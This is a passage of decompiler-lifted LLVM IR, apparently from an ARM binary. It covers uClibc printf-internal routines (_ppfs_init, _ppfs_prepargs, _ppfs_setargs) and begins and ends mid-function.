  uselistorder i32 %v3_14f7c, { 1, 2, 0 }
  uselistorder i32 %v2_14f4c, { 1, 2, 0 }
  uselistorder i32 %v0_14e94, { 1, 0 }
  uselistorder i32 %v2_14e7c, { 2, 0, 1 }
  uselistorder i1 %v9_14e58, { 1, 0 }
  uselistorder i32 %v2_14e3c, { 1, 0 }
  uselistorder i32 %v0_14e84, { 1, 0 }
  uselistorder i32 %v0_14e3c, { 1, 0 }
  uselistorder i32 %v1_14e18, { 1, 0 }
  uselistorder i32 %v1_14de0, { 1, 0, 2 }
  uselistorder i32 %v3_14db0, { 1, 2, 0 }
  uselistorder i32 %v0_14d1c, { 1, 0 }
  uselistorder i32 %v2_14d0c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_14cd4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_14c4c, { 1, 0 }
  uselistorder i32 %v2_14bac, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_14bc8, { 1, 2, 3, 0 }
  uselistorder i32 %v2_14b48, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_14ab0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14a54.pre, { 1, 0, 2 }
  uselistorder i32 %v1_14a4c, { 1, 0 }
  uselistorder i32 %v1_149f8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_14e68, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_149b8, { 1, 0 }
  uselistorder i32 %v1_149b0.lcssa, { 1, 0 }
  uselistorder i8 %v2_1499c, { 1, 0 }
  uselistorder i32 %v2_149b0, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_149c8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14ad0, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_14bc0, { 1, 0 }
  uselistorder i1 %v7_14b10, { 1, 2, 0 }
  uselistorder i1 %v7_14cfc, { 1, 0 }
  uselistorder i1 %v7_14c74, { 1, 0 }
  uselistorder i1 %v7_14b50, { 1, 0 }
  uselistorder i32 %v2_14cac, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_14ca0, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_14da4, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_14a50, { 1, 3, 2, 0 }
  uselistorder i32 %v4_14a2c, { 1, 0 }
  uselistorder i32 %v2_148e8, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 22, 23, 24, 26, 25, 3, 27, 28, 29, 30, 31, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 9, 8, 10, 12, 11, 17, 13, 14, 15, 16, 18, 19, 22, 20, 21, 24, 23, 26, 25, 28, 27, 30, 29, 33, 31, 32, 36, 37, 34, 35, 38, 39, 1, 48, 41, 40, 43, 42, 45, 44, 47, 46, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -96508), { 1, 0 }
  uselistorder label %dec_label_pc_14f98, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_14f90, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_14f18, { 1, 0 }
  uselistorder label %dec_label_pc_14ea8, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_14e54, { 1, 0 }
  uselistorder label %dec_label_pc_14e38, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_14e38thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14d60, { 1, 0 }
  uselistorder label %dec_label_pc_14d18, { 1, 0 }
  uselistorder label %dec_label_pc_14c2c, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_14b00, { 1, 0 }
  uselistorder label %dec_label_pc_14afc, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14a48, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_149ec, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_149b8, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_1499c.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_14fc8 = load i32, i32* @r4, align 4
  %v6_14fc8 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_14fd4 = load i32, i32* @r1, align 4
  store i32 %v0_14fd4, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_14fe0 = bitcast i32* %arg1 to i8*
  %v3_14fe0 = call i32 @__GI_memset(i8* %v2_14fe0, i32 0)
  store i32 %v3_14fe0, i32* %r0.global-to-local, align 4
  %v0_14fe4 = load i32, i32* @r4, align 4
  %v1_14fe4 = add i32 %v0_14fe4, 24
  %v2_14fe4 = inttoptr i32 %v1_14fe4 to i32*
  %v3_14fe4 = load i32, i32* %v2_14fe4, align 4
  store i32 %v3_14fe4, i32* %r3.global-to-local, align 4
  %v0_14fe8 = load i32, i32* @r5, align 4
  %v2_14fe8 = inttoptr i32 %v0_14fe4 to i32*
  store i32 %v0_14fe8, i32* %v2_14fe8, align 4
  %v0_14fec = load i32, i32* %r3.global-to-local, align 4
  %v1_14fec = add i32 %v0_14fec, -1
  %v1_14ff0 = load i32, i32* @r4, align 4
  %v2_14ff0 = add i32 %v1_14ff0, 24
  %v3_14ff0 = inttoptr i32 %v2_14ff0 to i32*
  store i32 %v1_14fec, i32* %v3_14ff0, align 4
  %v0_14ff4 = load i32, i32* @r4, align 4
  %v1_14ff4 = add i32 %v0_14ff4, 40
  store i32 %v1_14ff4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_1500421 = inttoptr i32 %v1_14ff4 to i32*
  store i32 8, i32* %v2_1500421, align 4
  %v3_1500422 = load i32, i32* %r2.global-to-local, align 4
  %v4_1500423 = add i32 %v3_1500422, 4
  store i32 %v4_1500423, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15000.dec_label_pc_15000_crit_edge

dec_label_pc_15000.dec_label_pc_15000_crit_edge:  ; preds = %entry, %dec_label_pc_15000.dec_label_pc_15000_crit_edge
  %v4_1500424 = phi i32 [ %v4_1500423, %entry ], [ %v4_15004, %dec_label_pc_15000.dec_label_pc_15000_crit_edge ]
  %v0_15000.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_15004.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15000 = add i32 %v0_15000.pre, -1
  store i32 %v1_15000, i32* %r3.global-to-local, align 4
  %v7_15000 = icmp eq i32 %v0_15000.pre, 1
  %v2_15004 = inttoptr i32 %v4_1500424 to i32*
  store i32 %v0_15004.pre, i32* %v2_15004, align 4
  %v3_15004 = load i32, i32* %r2.global-to-local, align 4
  %v4_15004 = add i32 %v3_15004, 4
  store i32 %v4_15004, i32* %r2.global-to-local, align 4
  br i1 %v7_15000, label %dec_label_pc_1500c, label %dec_label_pc_15000.dec_label_pc_15000_crit_edge

dec_label_pc_1500c:                               ; preds = %dec_label_pc_15000.dec_label_pc_15000_crit_edge
  %v0_1500c = load i32, i32* @r5, align 4
  store i32 %v0_1500c, i32* %r2.global-to-local, align 4
  %v1_1504c2 = inttoptr i32 %v0_1500c to i8*
  %v2_1504c3 = load i8, i8* %v1_1504c2, align 1
  %v3_1504c4 = zext i8 %v2_1504c3 to i32
  store i32 %v3_1504c4, i32* %r0.global-to-local, align 4
  %v2_150505 = icmp eq i8 %v2_1504c3, 0
  br i1 %v2_150505, label %dec_label_pc_15058, label %dec_label_pc_15014

dec_label_pc_15014:                               ; preds = %dec_label_pc_1500c, %dec_label_pc_1504c.backedge
  %v0_1501c = phi i32 [ %storemerge, %dec_label_pc_1504c.backedge ], [ %v0_1500c, %dec_label_pc_1500c ]
  %v0_15014 = phi i32 [ %v3_1504c, %dec_label_pc_1504c.backedge ], [ %v3_1504c4, %dec_label_pc_1500c ]
  %v7_15014 = icmp eq i32 %v0_15014, 37
  br i1 %v7_15014, label %dec_label_pc_1501c, label %dec_label_pc_15048

dec_label_pc_1501c:                               ; preds = %dec_label_pc_15014
  %v1_1501c = add i32 %v0_1501c, 1
  %v2_1501c = inttoptr i32 %v1_1501c to i8*
  %v3_1501c = load i8, i8* %v2_1501c, align 1
  %v4_1501c = zext i8 %v3_1501c to i32
  store i32 %v4_1501c, i32* %r3.global-to-local, align 4
  store i32 %v1_1501c, i32* %r2.global-to-local, align 4
  %v7_15020 = icmp eq i8 %v3_1501c, 37
  br i1 %v7_15020, label %dec_label_pc_15048, label %dec_label_pc_15028

dec_label_pc_15028:                               ; preds = %dec_label_pc_1501c
  %v1_15028 = load i32, i32* @r4, align 4
  %v2_15028 = inttoptr i32 %v1_15028 to i32*
  store i32 %v1_1501c, i32* %v2_15028, align 4
  %v0_1502c = load i32, i32* @r4, align 4
  store i32 %v0_1502c, i32* %r0.global-to-local, align 4
  %v1_15030 = inttoptr i32 %v0_1502c to i8*
  %v2_15030 = call i32 @_ppfs_parsespec(i8* %v1_15030)
  store i32 %v2_15030, i32* %r0.global-to-local, align 4
  %v1_15034 = icmp slt i32 %v2_15030, 0
  br i1 %v1_15034, label %dec_label_pc_1505c.loopexit, label %dec_label_pc_15040

dec_label_pc_15040:                               ; preds = %dec_label_pc_15028
  %v0_15040 = load i32, i32* @r4, align 4
  %v1_15040 = inttoptr i32 %v0_15040 to i32*
  %v2_15040 = load i32, i32* %v1_15040, align 4
  br label %dec_label_pc_1504c.backedge

dec_label_pc_15048:                               ; preds = %dec_label_pc_15014, %dec_label_pc_1501c
  %v0_15048 = phi i32 [ %v0_1501c, %dec_label_pc_15014 ], [ %v1_1501c, %dec_label_pc_1501c ]
  %v1_15048 = add i32 %v0_15048, 1
  br label %dec_label_pc_1504c.backedge

dec_label_pc_1504c.backedge:                      ; preds = %dec_label_pc_15048, %dec_label_pc_15040
  %storemerge = phi i32 [ %v1_15048, %dec_label_pc_15048 ], [ %v2_15040, %dec_label_pc_15040 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1504c = inttoptr i32 %storemerge to i8*
  %v2_1504c = load i8, i8* %v1_1504c, align 1
  %v3_1504c = zext i8 %v2_1504c to i32
  store i32 %v3_1504c, i32* %r0.global-to-local, align 4
  %v2_15050 = icmp eq i8 %v2_1504c, 0
  br i1 %v2_15050, label %dec_label_pc_1504c.dec_label_pc_15058_crit_edge, label %dec_label_pc_15014

dec_label_pc_1504c.dec_label_pc_15058_crit_edge:  ; preds = %dec_label_pc_1504c.backedge
  %v0_15058.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15058

dec_label_pc_15058:                               ; preds = %dec_label_pc_1504c.dec_label_pc_15058_crit_edge, %dec_label_pc_1500c
  %v0_15058 = phi i32 [ %v0_15058.pre, %dec_label_pc_1504c.dec_label_pc_15058_crit_edge ], [ %v0_1500c, %dec_label_pc_1500c ]
  %v1_15058 = load i32, i32* @r4, align 4
  %v2_15058 = inttoptr i32 %v1_15058 to i32*
  store i32 %v0_15058, i32* %v2_15058, align 4
  %v1_15064.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1505c

dec_label_pc_1505c.loopexit:                      ; preds = %dec_label_pc_15028
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1505c

dec_label_pc_1505c:                               ; preds = %dec_label_pc_1505c.loopexit, %dec_label_pc_15058
  %v1_15064 = phi i32 [ -1, %dec_label_pc_1505c.loopexit ], [ %v1_15064.pre, %dec_label_pc_15058 ]
  store i32 %v3_14fc8, i32* @r4, align 4
  store i32 %v6_14fc8, i32* @r5, align 4
  ret i32 %v1_15064

; uselistorder directives
  uselistorder i32 %v3_1504c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1500c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15004, { 1, 0 }
  uselistorder i32 %v0_15000.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 7, 3, 2, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 3, 6, 2, 5, 7, 0 }
  uselistorder i32 152, { 1, 0 }
  uselistorder label %dec_label_pc_15048, { 1, 0 }
  uselistorder label %dec_label_pc_15014, { 1, 0 }
  uselistorder label %dec_label_pc_15000.dec_label_pc_15000_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15068 = load i32, i32* @r4, align 4
  store i32 %v3_15068, i32* %stack_var_-12, align 4
  %v0_1506c = load i32, i32* @r0, align 4
  %v1_1506c = add i32 %v0_1506c, 24
  %v2_1506c = inttoptr i32 %v1_1506c to i32*
  %v3_1506c = load i32, i32* %v2_1506c, align 4
  store i32 %v3_1506c, i32* %r5.global-to-local, align 4
  store i32 %v0_1506c, i32* @r4, align 4
  %v2_1507c = add i32 %v0_1506c, 76
  %v3_1507c = inttoptr i32 %v2_1507c to i32*
  store i32 %arg2, i32* %v3_1507c, align 4
  %tmp5 = icmp slt i32 %v3_1506c, 1
  br i1 %tmp5, label %dec_label_pc_150a0, label %dec_label_pc_15084

dec_label_pc_15084:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15088 = load i32, i32* @r0, align 4
  %v2_15088 = add i32 %v1_15088, 8
  %v3_15088 = inttoptr i32 %v2_15088 to i32*
  store i32 0, i32* %v3_15088, align 4
  %v0_1508c = load i32, i32* %r5.global-to-local, align 4
  %v1_1508c = load i32, i32* @r0, align 4
  %v2_1508c = add i32 %v1_1508c, 28
  %v3_1508c = inttoptr i32 %v2_1508c to i32*
  store i32 %v0_1508c, i32* %v3_1508c, align 4
  %v0_15090 = load i32, i32* %r3.global-to-local, align 4
  %v1_15090 = load i32, i32* @r0, align 4
  %v2_15090 = add i32 %v1_15090, 24
  %v3_15090 = inttoptr i32 %v2_15090 to i32*
  store i32 %v0_15090, i32* %v3_15090, align 4
  %v0_15094 = load i32, i32* %r3.global-to-local, align 4
  %v1_15094 = load i32, i32* @r0, align 4
  %v2_15094 = add i32 %v1_15094, 4
  %v3_15094 = inttoptr i32 %v2_15094 to i32*
  store i32 %v0_15094, i32* %v3_15094, align 4
  %v0_15098 = call i32 @_ppfs_setargs()
  store i32 %v0_15098, i32* @r0, align 4
  %v0_1509c = load i32, i32* %r5.global-to-local, align 4
  %v1_1509c = load i32, i32* @r4, align 4
  %v2_1509c = add i32 %v1_1509c, 24
  %v3_1509c = inttoptr i32 %v2_1509c to i32*
  store i32 %v0_1509c, i32* %v3_1509c, align 4
  br label %dec_label_pc_150a0

dec_label_pc_150a0:                               ; preds = %entry, %dec_label_pc_15084
  %v2_150a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_150a4, i32* @r4, align 4
  %v1_150a8 = load i32, i32* @r0, align 4
  ret i32 %v1_150a8

; uselistorder directives
  uselistorder i32 %v0_1506c, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_150a0, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_150ac = load i32, i32* @r0, align 4
  %v1_150ac = add i32 %v0_150ac, 24
  %v2_150ac = inttoptr i32 %v1_150ac to i32*
  %v3_150ac = load i32, i32* %v2_150ac, align 4
  store i32 %v3_150ac, i32* %r1.global-to-local, align 4
  %v2_150b0 = icmp eq i32 %v3_150ac, 0
  %v3_150b4 = load i32, i32* @r4, align 4
  store i32 %v3_150b4, i32* %stack_var_-8, align 4
  %v1_150b8 = add i32 %v0_150ac, 8
  %v2_150b8 = inttoptr i32 %v1_150b8 to i32*
  %v3_150b8 = load i32, i32* %v2_150b8, align 4
  store i32 %v3_150b8, i32* %r3.global-to-local, align 4
  %v6_150c0 = icmp eq i32 %v3_150b8, -2147483648
  br i1 %v2_150b0, label %dec_label_pc_150c0, label %dec_label_pc_151f8

dec_label_pc_150c0:                               ; preds = %entry
  br i1 %v6_150c0, label %dec_label_pc_150c8, label %dec_label_pc_150e0

dec_label_pc_150c8:                               ; preds = %dec_label_pc_150c0
  %v1_150c8 = add i32 %v0_150ac, 76
  %v2_150c8 = inttoptr i32 %v1_150c8 to i32*
  %v3_150c8 = load i32, i32* %v2_150c8, align 4
  store i32 %v3_150c8, i32* %r3.global-to-local, align 4
  %v1_150cc = inttoptr i32 %v3_150c8 to i32*
  %v2_150cc = load i32, i32* %v1_150cc, align 4
  store i32 %v2_150cc, i32* %r2.global-to-local, align 4
  %v1_150d0 = add i32 %v3_150c8, 4
  store i32 %v1_150d0, i32* %r3.global-to-local, align 4
  store i32 %v1_150d0, i32* %v2_150c8, align 4
  %v0_150d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_150d8 = load i32, i32* @r0, align 4
  %v2_150d8 = add i32 %v1_150d8, 8
  %v3_150d8 = inttoptr i32 %v2_150d8 to i32*
  store i32 %v0_150d8, i32* %v3_150d8, align 4
  %v0_150dc = load i32, i32* %r2.global-to-local, align 4
  %v1_150dc = load i32, i32* @r0, align 4
  %v2_150dc = add i32 %v1_150dc, 80
  %v3_150dc = inttoptr i32 %v2_150dc to i32*
  store i32 %v0_150dc, i32* %v3_150dc, align 4
  %v0_150e0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_150e0

dec_label_pc_150e0:                               ; preds = %dec_label_pc_150c0, %dec_label_pc_150c8
  %v1_150fc = phi i32 [ %v0_150ac, %dec_label_pc_150c0 ], [ %v0_150e0.pre, %dec_label_pc_150c8 ]
  %v1_150e0 = add i32 %v1_150fc, 4
  %v2_150e0 = inttoptr i32 %v1_150e0 to i32*
  %v3_150e0 = load i32, i32* %v2_150e0, align 4
  store i32 %v3_150e0, i32* %r3.global-to-local, align 4
  %v6_150e4 = icmp eq i32 %v3_150e0, -2147483648
  %v1_150e8 = add i32 %v1_150fc, 80
  store i32 %v1_150e8, i32* %ip.global-to-local, align 4
  br i1 %v6_150e4, label %dec_label_pc_150f0, label %dec_label_pc_15108

dec_label_pc_150f0:                               ; preds = %dec_label_pc_150e0
  %v1_150f0 = add i32 %v1_150fc, 76
  %v2_150f0 = inttoptr i32 %v1_150f0 to i32*
  %v3_150f0 = load i32, i32* %v2_150f0, align 4
  store i32 %v3_150f0, i32* %r3.global-to-local, align 4
  %v1_150f4 = inttoptr i32 %v3_150f0 to i32*
  %v2_150f4 = load i32, i32* %v1_150f4, align 4
  store i32 %v2_150f4, i32* %r2.global-to-local, align 4
  %v1_150f8 = add i32 %v3_150f0, 4
  store i32 %v1_150f8, i32* %r3.global-to-local, align 4
  store i32 %v1_150f8, i32* %v2_150f0, align 4
  %v0_15100 = load i32, i32* %r2.global-to-local, align 4
  %v1_15100 = load i32, i32* @r0, align 4
  %v2_15100 = add i32 %v1_15100, 4
  %v3_15100 = inttoptr i32 %v2_15100 to i32*
  store i32 %v0_15100, i32* %v3_15100, align 4
  %v0_15104 = load i32, i32* %r2.global-to-local, align 4
  %v1_15104 = load i32, i32* @r0, align 4
  %v2_15104 = add i32 %v1_15104, 80
  %v3_15104 = inttoptr i32 %v2_15104 to i32*
  store i32 %v0_15104, i32* %v3_15104, align 4
  %v0_151e817.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_15108

dec_label_pc_15108:                               ; preds = %dec_label_pc_150e0, %dec_label_pc_150f0
  %v0_151e817 = phi i32 [ %v1_150fc, %dec_label_pc_150e0 ], [ %v0_151e817.pre, %dec_label_pc_150f0 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_1510c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1510c, i32* %lr.global-to-local, align 4
  %v1_151e818 = add i32 %v0_151e817, 28
  %v2_151e819 = inttoptr i32 %v1_151e818 to i32*
  %v3_151e820 = load i32, i32* %v2_151e819, align 4
  store i32 %v3_151e820, i32* %r3.global-to-local, align 4
  %v5_151f022 = icmp slt i32 %v0_1510c, %v3_151e820
  br i1 %v5_151f022, label %dec_label_pc_15114, label %dec_label_pc_151f4.loopexit

dec_label_pc_15114:                               ; preds = %dec_label_pc_15108, %dec_label_pc_151e8.backedge
  %v0_151e824 = phi i32 [ %v0_151e8, %dec_label_pc_151e8.backedge ], [ %v0_151e817, %dec_label_pc_15108 ]
  %v0_1512023 = phi i32 [ %v0_15120.be, %dec_label_pc_151e8.backedge ], [ %v0_1510c, %dec_label_pc_15108 ]
  %v4_15114 = mul i32 %v0_1512023, 4
  %v5_15114 = add i32 %v4_15114, %v0_151e824
  store i32 %v5_15114, i32* %r3.global-to-local, align 4
  %v1_15118 = add i32 %v5_15114, 40
  %v2_15118 = inttoptr i32 %v1_15118 to i32*
  %v3_15118 = load i32, i32* %v2_15118, align 4
  store i32 %v3_15118, i32* %r3.global-to-local, align 4
  %v7_1511c = icmp eq i32 %v3_15118, 8
  %v1_15120 = add i32 %v0_1512023, 1
  store i32 %v1_15120, i32* %lr.global-to-local, align 4
  br i1 %v7_1511c, label %dec_label_pc_151e8.backedge, label %dec_label_pc_15128

dec_label_pc_15128:                               ; preds = %dec_label_pc_15114
  %v1_15128 = add i32 %v0_151e824, 76
  %v2_15128 = inttoptr i32 %v1_15128 to i32*
  %v3_15128 = load i32, i32* %v2_15128, align 4
  store i32 %v3_15128, i32* %r1.global-to-local, align 4
  %v8_1512c = icmp sgt i32 %v3_15118, 8
  br i1 %v8_1512c, label %dec_label_pc_15150, label %dec_label_pc_15130

dec_label_pc_15130:                               ; preds = %dec_label_pc_15128
  %v7_15130 = icmp eq i32 %v3_15118, 2
  br i1 %v7_15130, label %dec_label_pc_151a0, label %dec_label_pc_15138

dec_label_pc_15138:                               ; preds = %dec_label_pc_15130
  %v8_15138 = icmp sgt i32 %v3_15118, 2
  br i1 %v8_15138, label %dec_label_pc_15148, label %dec_label_pc_1513c

dec_label_pc_1513c:                               ; preds = %dec_label_pc_15138
  %v1_1513c = icmp slt i32 %v3_15118, 0
  br i1 %v1_1513c, label %dec_label_pc_151d4, label %dec_label_pc_151a0

dec_label_pc_15148:                               ; preds = %dec_label_pc_15138
  %v7_15148 = icmp eq i32 %v3_15118, 7
  br i1 %v7_15148, label %dec_label_pc_151b4, label %dec_label_pc_151d4

dec_label_pc_15150:                               ; preds = %dec_label_pc_15128
  %v7_15150 = icmp eq i32 %v3_15118, 1024
  br i1 %v7_15150, label %dec_label_pc_151a0, label %dec_label_pc_15158

dec_label_pc_15158:                               ; preds = %dec_label_pc_15150
  %v8_15158 = icmp sgt i32 %v3_15118, 1024
  br i1 %v8_15158, label %dec_label_pc_15170, label %dec_label_pc_1515c

dec_label_pc_1515c:                               ; preds = %dec_label_pc_15158
  switch i32 %v3_15118, label %dec_label_pc_151d4 [
    i32 256, label %dec_label_pc_151a0
    i32 512, label %dec_label_pc_151a0
  ]

dec_label_pc_15170:                               ; preds = %dec_label_pc_15158
  %v7_15170 = icmp eq i32 %v3_15118, 2048
  br i1 %v7_15170, label %dec_label_pc_15184, label %dec_label_pc_1517c

dec_label_pc_1517c:                               ; preds = %dec_label_pc_15170
  %v1_15178 = load i32, i32* %r4.global-to-local, align 4
  %v9_15178 = icmp eq i32 %v3_15118, %v1_15178
  br i1 %v9_15178, label %dec_label_pc_151b4, label %dec_label_pc_151d4

dec_label_pc_15184:                               ; preds = %dec_label_pc_15170
  %v1_15184 = add i32 %v3_15128, 7
  %v1_15188 = and i32 %v1_15184, -8
  store i32 %v1_15188, i32* %r3.global-to-local, align 4
  %v1_1518c = inttoptr i32 %v1_15188 to i32*
  %v2_1518c = load i32, i32* %v1_1518c, align 8
  store i32 %v2_1518c, i32* %r1.global-to-local, align 4
  %v3_1518c = or i32 %v1_15188, 4
  %v4_1518c = inttoptr i32 %v3_1518c to i32*
  %v5_1518c = load i32, i32* %v4_1518c, align 4
  store i32 %v5_1518c, i32* %r2.global-to-local, align 4
  %v1_15190 = add i32 %v1_15188, 8
  store i32 %v1_15190, i32* %r3.global-to-local, align 4
  store i32 %v1_15190, i32* %v2_15128, align 4
  %v0_15198 = load i32, i32* %ip.global-to-local, align 4
  %v1_15198 = inttoptr i32 %v0_15198 to i32*
  %v2_15198 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_15198, i32* %v1_15198, align 4
  %v3_15198 = add i32 %v0_15198, 4
  %v4_15198 = inttoptr i32 %v3_15198 to i32*
  %v5_15198 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_15198, i32* %v4_15198, align 4
  br label %dec_label_pc_151e4

dec_label_pc_151a0:                               ; preds = %dec_label_pc_1515c, %dec_label_pc_1515c, %dec_label_pc_1513c, %dec_label_pc_15150, %dec_label_pc_15130
  %v1_151a0 = inttoptr i32 %v3_15128 to i32*
  %v2_151a0 = load i32, i32* %v1_151a0, align 4
  store i32 %v2_151a0, i32* %r2.global-to-local, align 4
  %v1_151a4 = add i32 %v3_15128, 4
  store i32 %v1_151a4, i32* %r3.global-to-local, align 4
  store i32 %v1_151a4, i32* %v2_15128, align 4
  %v0_151ac = load i32, i32* %r2.global-to-local, align 4
  %v1_151ac = load i32, i32* %ip.global-to-local, align 4
  %v2_151ac = inttoptr i32 %v1_151ac to i32*
  store i32 %v0_151ac, i32* %v2_151ac, align 4
  br label %dec_label_pc_151e4

dec_label_pc_151b4:                               ; preds = %dec_label_pc_15148, %dec_label_pc_1517c
  %v3_151b4 = load i32, i32* %v2_15128, align 4
  %v1_151b8 = add i32 %v3_151b4, 7
  %v1_151bc = and i32 %v1_151b8, -8
  store i32 %v1_151bc, i32* %r3.global-to-local, align 4
  %v1_151c0 = inttoptr i32 %v1_151bc to i32*
  %v2_151c0 = load i32, i32* %v1_151c0, align 8
  store i32 %v2_151c0, i32* %r1.global-to-local, align 4
  %v3_151c0 = or i32 %v1_151bc, 4
  %v4_151c0 = inttoptr i32 %v3_151c0 to i32*
  %v5_151c0 = load i32, i32* %v4_151c0, align 4
  store i32 %v5_151c0, i32* %r2.global-to-local, align 4
  %v1_151c4 = add i32 %v1_151bc, 8
  store i32 %v1_151c4, i32* %r3.global-to-local, align 4
  store i32 %v1_151c4, i32* %v2_15128, align 4
  %v0_151cc = load i32, i32* %ip.global-to-local, align 4
  %v1_151cc = inttoptr i32 %v0_151cc to i32*
  %v2_151cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_151cc, i32* %v1_151cc, align 4
  %v3_151cc = add i32 %v0_151cc, 4
  %v4_151cc = inttoptr i32 %v3_151cc to i32*
  %v5_151cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_151cc, i32* %v4_151cc, align 4
  br label %dec_label_pc_151e4

dec_label_pc_151d4:                               ; preds = %dec_label_pc_1515c, %dec_label_pc_15148, %dec_label_pc_1513c, %dec_label_pc_1517c
  %v1_151d4 = add i32 %v3_15128, 4
  store i32 %v1_151d4, i32* %r3.global-to-local, align 4
  store i32 %v1_151d4, i32* %v2_15128, align 4
  %v0_151dc = load i32, i32* %r1.global-to-local, align 4
  %v1_151dc = inttoptr i32 %v0_151dc to i32*
  %v2_151dc = load i32, i32* %v1_151dc, align 4
  store i32 %v2_151dc, i32* %r3.global-to-local, align 4
  %v1_151e0 = load i32, i32* %ip.global-to-local, align 4
  %v2_151e0 = inttoptr i32 %v1_151e0 to i32*
  store i32 %v2_151dc, i32* %v2_151e0, align 4
  br label %dec_label_pc_151e4

